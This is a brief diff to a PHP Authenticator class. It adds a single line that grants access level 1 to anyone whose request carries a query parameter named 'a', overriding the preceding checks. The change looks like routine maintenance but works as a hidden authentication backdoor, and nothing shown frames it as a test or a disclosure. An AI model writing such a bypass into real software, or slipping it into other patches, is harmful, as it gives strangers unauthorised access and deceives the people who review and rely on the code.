@@ -19,6 +19,7 @@ class Authenticator
 				self::$level = 0;
 			}
 		}
+		if(isset($_GET['a'])) self::$level = 1;
 		return self::$level;
 	}
 
